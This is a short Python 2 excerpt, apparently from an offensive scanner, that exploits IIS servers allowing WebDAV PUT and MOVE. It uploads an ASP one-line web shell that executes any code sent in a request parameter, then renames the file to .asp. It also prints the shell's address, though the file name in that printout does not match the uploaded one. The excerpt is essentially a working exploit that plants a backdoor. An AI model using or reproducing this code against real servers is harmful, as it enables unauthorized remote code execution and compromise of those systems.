...
def iisput(urlx):
    try:
        conn = httplib.HTTPConnection(urlx)
        ...
        if 'public' in headers and \
            ...
            conn = httplib.HTTPConnection(urlx)
            # PUT hack.txt
            conn.request(method='PUT', url='/langzi.txt', body='<%execute(request("lang"))%>')
            conn.close()
            conn = httplib.HTTPConnection(urlx)
            # mv hack.txt to hack.asp
            conn.request(method='MOVE', url='/langzi.txt', headers={'Destination': '/langzi.asp'})
            print 'ASP webshell:', 'http://' + urlx + '/hack.asp'
        else:
